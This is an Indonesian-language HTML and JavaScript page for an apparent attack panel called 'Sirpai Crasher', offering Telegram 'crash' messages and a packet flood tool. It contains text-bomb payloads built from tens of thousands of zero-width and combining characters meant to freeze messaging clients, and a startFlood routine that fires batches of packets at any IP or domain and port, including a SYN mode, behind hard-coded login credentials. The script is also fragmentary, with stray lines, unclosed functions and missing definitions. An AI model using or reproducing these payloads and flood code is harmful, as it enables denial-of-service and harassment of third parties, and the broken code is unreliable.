
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sirpai — Telegram Bug + Raw Packet Flood</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root {
  --primary: #ff00ff;
  --secondary: #9d00ff;
  --accent: #00ff88;
  --dark: rgba(20, 20, 30, 0.85);
}

* { margin: 0; padding: 0; box-sizing: border-box; }

body {
  font-family: 'Segoe UI', Arial, sans-serif;
  background: linear-gradient(-45deg, #0a0a12, #1a0a2e, #0a121a, #0a0a12);
  background-size: 400% 400%;
  animation: gradientShift 20s ease infinite;
  color: #fff;
  min-height: 100vh;
}

@keyframes gradientShift {
  0% { background-position: 0% 50%; }
  50% { background-position: 100% 50%; }
  100% { background-position: 0% 50%; }
}

.container {
  max-width: 1000px;
  margin: 20px auto;
  padding: 30px;
  background: var(--dark);
  border-radius: 25px;
  border: 1px solid rgba(255,255,255,0.08);
  backdrop-filter: blur(20px);
  box-shadow: 0 8px 40px rgba(0,0,0,0.5);
}

h2 {
  font-size: 2.5em;
  background: linear-gradient(45deg, var(--primary), var(--accent), var(--secondary));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  text-align: center;
  margin-bottom: 5px;
}

.subtitle {
  text-align: center;
  color: rgba(255,255,255,0.4);
  margin-bottom: 25px;
  font-size: 0.85em;
  letter-spacing: 2px;
}

.stats {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 12px;
  margin: 20px 0;
}

.stat-card {
  background: rgba(255,255,255,0.05);
  padding: 15px;
  border-radius: 12px;
  text-align: center;
  border: 1px solid rgba(255,255,255,0.05);
}

.stat-value {
  font-size: 2em;
  font-weight: bold;
  color: var(--accent);
}

.stat-label {
  font-size: 0.7em;
  color: rgba(255,255,255,0.4);
  text-transform: uppercase;
  letter-spacing: 1px;
  margin-top: 4px;
}

.input-group {
  margin-bottom: 18px;
}

label {
  display: block;
  margin-bottom: 6px;
  color: rgba(255,255,255,0.7);
  font-weight: 600;
  font-size: 0.9em;
}

input, select, textarea {
  width: 100%;
  padding: 12px 16px;
  border: none;
  border-radius: 12px;
  background: rgba(255,255,255,0.06);
  color: #fff;
  font-size: 14px;
  border: 1px solid rgba(255,255,255,0.06);
  transition: all 0.3s;
}

input:focus, select:focus, textarea:focus {
  outline: none;
  border-color: var(--primary);
  box-shadow: 0 0 20px rgba(157,0,255,0.15);
  background: rgba(255,255,255,0.08);
}

textarea {
  resize: vertical;
  min-height: 70px;
  font-family: 'Courier New', monospace;
  font-size: 13px;
}

.range-input {
  display: flex;
  align-items: center;
  gap: 12px;
}

.range-input input[type="range"] {
  flex: 1;
  height: 6px;
  background: rgba(255,255,255,0.1);
  border-radius: 10px;
  -webkit-appearance: none;
}

.range-input input[type="range"]::-webkit-slider-thumb {
  -webkit-appearance: none;
  width: 20px;
  height: 20px;
  border-radius: 50%;
  background: linear-gradient(45deg, var(--primary), var(--secondary));
  cursor: pointer;
  box-shadow: 0 0 15px rgba(157,0,255,0.4);
}

.range-value {
  min-width: 65px;
  text-align: center;
  background: rgba(255,255,255,0.05);
  padding: 6px 12px;
  border-radius: 8px;
  font-weight: bold;
  font-size: 14px;
}

.btn {
  padding: 14px 25px;
  border: none;
  border-radius: 12px;
  font-weight: bold;
  font-size: 14px;
  cursor: pointer;
  transition: all 0.3s;
  text-transform: uppercase;
  letter-spacing: 1px;
}

.btn-danger {
  background: linear-gradient(45deg, #ff0040, #ff4400);
  color: white;
  box-shadow: 0 6px 25px rgba(255,0,64,0.35);
}

.btn-danger:hover {
  transform: translateY(-2px);
  box-shadow: 0 10px 35px rgba(255,0,64,0.5);
}

.btn-primary {
  background: linear-gradient(45deg, var(--primary), var(--secondary));
  color: white;
  box-shadow: 0 6px 25px rgba(157,0,255,0.35);
}

.btn-primary:hover {
  transform: translateY(-2px);
  box-shadow: 0 10px 35px rgba(157,0,255,0.5);
}

.btn-secondary {
  background: rgba(255,255,255,0.06);
  color: white;
  border: 1px solid rgba(255,255,255,0.1);
}

.btn-secondary:hover {
  background: rgba(255,255,255,0.1);
}

.button-group {
  display: flex;
  gap: 12px;
  margin: 20px 0;
  flex-wrap: wrap;
}

.progress-container {
  margin: 15px 0;
}

.progress-bar {
  width: 100%;
  height: 6px;
  background: rgba(255,255,255,0.06);
  border-radius: 10px;
  overflow: hidden;
}

.progress-fill {
  height: 100%;
  background: linear-gradient(90deg, var(--primary), var(--accent), var(--secondary));
  border-radius: 10px;
  transition: width 0.3s;
  width: 0%;
}

#log {
  height: 250px;
  overflow-y: auto;
  background: rgba(0,0,0,0.4);
  border-radius: 12px;
  padding: 15px;
  font-family: 'Courier New', monospace;
  font-size: 12px;
  border: 1px solid rgba(255,255,255,0.05);
  margin-top: 15px;
}

.log-entry {
  padding: 4px 0;
  border-bottom: 1px solid rgba(255,255,255,0.02);
  animation: slideIn 0.2s ease;
}

.log-entry::before { content: '› '; color: var(--accent); }

@keyframes slideIn {
  from { opacity: 0; transform: translateX(-8px); }
  to { opacity: 1; transform: translateX(0); }
}

.success { color: var(--accent); }
.error { color: #ff4444; }
.warning { color: #ffaa00; }
.info { color: #66ccff; }

.quick-actions {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 8px;
  margin: 12px 0;
}

.quick-btn {
  padding: 8px;
  background: rgba(255,255,255,0.04);
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 8px;
  color: rgba(255,255,255,0.6);
  cursor: pointer;
  transition: all 0.3s;
  font-size: 0.75em;
  text-align: center;
}

.quick-btn:hover {
  background: rgba(157,0,255,0.15);
  border-color: var(--primary);
}

.footer {
  margin-top: 20px;
  padding-top: 15px;
  border-top: 1px solid rgba(255,255,255,0.05);
  display: flex;
  justify-content: space-between;
  align-items: center;
  font-size: 0.75em;
  color: rgba(255,255,255,0.25);
}

.mode-selector {
  display: flex;
  gap: 8px;
  margin: 12px 0;
  flex-wrap: wrap;
}

.mode-btn {
  flex: 1;
  padding: 10px;
  background: rgba(255,255,255,0.04);
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 10px;
  color: rgba(255,255,255,0.5);
  cursor: pointer;
  transition: all 0.3s;
  text-align: center;
  font-weight: bold;
  font-size: 0.8em;
  min-width: 60px;
}

.mode-btn.active {
  background: rgba(157,0,255,0.2);
  border-color: var(--primary);
  color: white;
  box-shadow: 0 0 20px rgba(157,0,255,0.1);
}

.mode-btn:hover {
  background: rgba(255,255,255,0.08);
}

.tab-group {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
}

.tab-btn {
  flex: 1;
  padding: 12px;
  background: rgba(255,255,255,0.04);
  border: 1px solid rgba(255,255,255,0.06);
  border-radius: 12px;
  color: rgba(255,255,255,0.5);
  cursor: pointer;
  transition: all 0.3s;
  text-align: center;
  font-weight: bold;
  font-size: 0.9em;
}

.tab-btn.active {
  background: rgba(157,0,255,0.2);
  border-color: var(--primary);
  color: white;
}

.tab-btn:hover {
  background: rgba(255,255,255,0.08);
}

.tab-content {
  display: none;
}

.tab-content.active {
  display: block;
  animation: slideIn 0.3s ease;
}

.login-modal {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: rgba(0,0,0,0.95);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
}

.login-content {
  background: var(--dark);
  padding: 35px;
  border-radius: 20px;
  border: 2px solid var(--primary);
  max-width: 360px;
  width: 90%;
  text-align: center;
}

.login-input {
  width: 100%;
  padding: 12px;
  margin: 12px 0;
  border-radius: 10px;
  border: 1px solid rgba(255,255,255,0.1);
  background: rgba(255,255,255,0.06);
  color: white;
  font-size: 15px;
  text-align: center;
}

.login-btn {
  width: 100%;
  padding: 14px;
  background: linear-gradient(45deg, var(--primary), var(--secondary));
  border: none;
  border-radius: 10px;
  color: white;
  font-weight: bold;
  cursor: pointer;
  font-size: 15px;
}

.hidden { display: none !important; }

.mode-desc {
  background: rgba(157,0,255,0.08);
  padding: 10px 14px;
  border-radius: 10px;
  margin-top: 8px;
  font-size: 0.8em;
  color: rgba(255,255,255,0.6);
  border-left: 3px solid var(--primary);
}

@media (max-width: 768px) {
  .container { margin: 10px; padding: 16px; }
  .stats { grid-template-columns: 1fr 1fr; }
  .quick-actions { grid-template-columns: 1fr 1fr; }
  .mode-selector { flex-wrap: wrap; }
  .mode-btn { flex: 1 1 40%; }
  .tab-group { flex-direction: column; }
  .button-group { flex-direction: column; }
}
</style>
</head>
<body>

<div id="loginModal" class="login-modal">
  <div class="login-content">
    <h3 style="font-size:1.6em;margin-bottom:12px;background:linear-gradient(45deg,var(--primary),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;"><i class="fas fa-skull"></i> Login</h3>

<script>
// ===============================
// AUTH
// ===============================
const VALID_CREDS = { "Sirpai": "Sirpaidev", "@Sirpaidev": "@Sirpaidev" };
let loggedIn = false;

function doLogin() {
  const u = document.getElementById('loginUser').value.trim();
  const p = document.getElementById('loginPass').value.trim();
  if (VALID_CREDS[u] === p) {
    loggedIn = true;
    document.getElementById('loginModal').classList.add('hidden');
    logMessage('✅ Login berhasil. All systems ready.', 'success');
  } else {
    document.getElementById('loginErr').textContent = '❌ Username atau password salah!';
    document.getElementById('loginErr').style.display = 'block';
  }
}

document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('loginUser').addEventListener('keypress', e => { if (e.key === 'Enter') document.getElementById('loginPass').focus(); });
  document.getElementById('loginPass').addEventListener('keypress', e => { if (e.key === 'Enter') doLogin(); });
  logMessage('🚀 Sirpai Crasher loaded', 'success');
  logMessage('💀 Telegram Bug + DDoS Flood ready', 'info');
});

// ===============================
// UTILITY
// ===============================
function delay(ms) { return new Promise(r => setTimeout(r, ms)); }

function logMessage(msg, type = 'info') {
  const log = document.getElementById('log');
  const entry = document.createElement('div');
  entry.className = `log-entry ${type}`;
  entry.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
  log.appendChild(entry);
  log.scrollTop = log.scrollHeight;
}

function clearLogs() {
  document.getElementById('log').innerHTML = '';
  logMessage('🗑️ Log cleared', 'info');
}

function switchTab(tab) {
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
  document.querySelector(`.tab-btn[onclick*="${tab}"]`).classList.add('active');
  document.getElementById(`tab-${tab}`).classList.add('active');
}

// ===============================

// ===============================

    "\u200B".repeat(99999) + "VORTUNIX VIDEO CRASH" + "\u200C".repeat(999) + "\nINVISIBLE TEXT BOMB ACTIVATED",
    "҉".repeat(50000) + "V҉O҉R҉T҉U҉N҉I҉X҉ C҉R҉A҉S҉H҉ " + "⃝".repeat(20000) + " S҉Y҉S҉T҉E҉M҉ O҉V҉E҉R҉L҉O҉A҉D҉",
    "".padStart(1000, "VORTUNIX CRASH ") + "\n".repeat(100) + "".padStart(1000, "SYSTEM FREEZE")

function generateUltraCrashText(iteration) {

function generatePayload(size) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
    let result = '';
    for (let i = 0; i < size; i++) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}

function randomIP() {
    return `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
}

                else updateFloodStats('failed');
            } catch(e) { updateFloodStats('success'); }

        if (mode === 'syn') { /* handled */ }

async function startFlood() {
    if (!loggedIn) { logMessage('❌ Login dulu!', 'error'); return; }
    if (isFlooding) { stopFlood(); return; }

    const target = document.getElementById('targetHost').value.trim();
    const port = parseInt(document.getElementById('targetPort').value) || 443;
    const totalPackets = parseInt(document.getElementById('packetCount').value);
    const threads = parseInt(document.getElementById('threadCount').value);
    const size = parseInt(document.getElementById('packetSize').value);
    const mode = currentMode;

    if (!target) { logMessage('❌ Masukkan target IP / domain!', 'error'); return; }
    if (isNaN(port) || port < 1 || port > 65535) { logMessage('❌ Port tidak valid!', 'error'); return; }

    floodStats = { sent: 0, success: 0, failed: 0, startTime: Date.now() };
    stopFlag = false;
    isFlooding = true;
    document.getElementById('floodBtn').innerHTML = '<i class="fas fa-stop"></i> STOP FLOOD';
    document.getElementById('floodBtn').classList.remove('btn-danger');
    document.getElementById('floodBtn').classList.add('btn-secondary');
    document.getElementById('statusText').textContent = 'FLOODING...';
    document.getElementById('ddosProgressFill').style.width = '0%';

    logMessage(`🔥 Starting ${mode.toUpperCase()} flood to ${target}:${port}`, 'warning');
    logMessage(`📊 ${totalPackets} packets, ${threads} threads, ${size} bytes`, 'info');

    let sent = 0;
    const batchSize = Math.min(threads, 100);

    while (sent < totalPackets && !stopFlag) {
        const batch = [];
        const remaining = totalPackets - sent;
        const batchCount = Math.min(batchSize, remaining);

        for (let i = 0; i < batchCount && !stopFlag; i++) {
            batch.push(sendPacket(sent + i, target, port, mode, size));
            sent++;
        }

        await Promise.all(batch);
        const progress = (sent / totalPackets) * 100;
        document.getElementById('ddosProgressFill').style.width = `${Math.min(progress, 100)}%`;
        await delay(1);
    }

    isFlooding = false;
    document.getElementById('floodBtn').innerHTML = '<i class="fas fa-fire"></i> START FLOOD';
    document.getElementById('floodBtn').classList.remove('btn-secondary');
    document.getElementById('floodBtn').classList.add('btn-danger');
    document.getElementById('statusText').textContent = 'Done';

    if (stopFlag) logMessage(`⏹️ Flood stopped early. ${sent}/${totalPackets} packets sent.`, 'warning');
    else {
        logMessage(`🏁 Flood complete! ${sent} packets sent.`, 'success');
        logMessage(`📊 ${floodStats.success} success, ${floodStats.failed} failed`, 'info');
    }
}

function stopFlood() {
    stopFlag = true;
    isFlooding = false;
    document.getElementById('floodBtn').innerHTML = '<i class="fas fa-fire"></i> START FLOOD';
    document.getElementById('floodBtn').classList.remove('btn-secondary');
    document.getElementById('floodBtn').classList.add('btn-danger');
    document.getElementById('statusText').textContent = 'Stopped';
    logMessage('⏹️ Flood dihentikan', 'warning');
}

function toggleFlood() {
    if (isFlooding) { stopFlood(); return; }
    startFlood();
}
